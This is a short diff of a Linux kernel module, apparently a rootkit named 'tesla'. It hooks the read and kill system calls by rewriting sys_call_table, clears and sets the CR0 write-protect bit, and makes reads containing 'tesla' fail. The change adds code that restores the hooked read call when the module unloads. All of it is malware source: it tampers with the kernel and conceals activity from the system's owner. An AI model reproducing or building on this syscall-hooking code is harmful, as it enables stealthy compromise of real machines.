@@ -20,7 +20,7 @@ MODULE_LICENSE("GPL v2");
 asmlinkage long tesla_read(unsigned int fd, char __user *buf, size_t count)
 {
 	int read;
-	read = (*orig_read)(fd, buf, count);
+	read = orig_read(fd, buf, count);
 	if(read){
 		if(strstr(buf, "tesla")){
 			return -EACCES;
@@ -111,6 +111,9 @@ void tesla_exit(void)
 
 	/* restore the kill system call to its original version */
 	sys_call_table[__NR_kill] = (long *)orig_kill;
+
+	/* restore the read system call to its original version */
+	sys_call_table[__NR_read] = (long *)orig_read;
 
 	/* set bit 16 of cr0 */
 	write_cr0(read_cr0() | 0x10000);
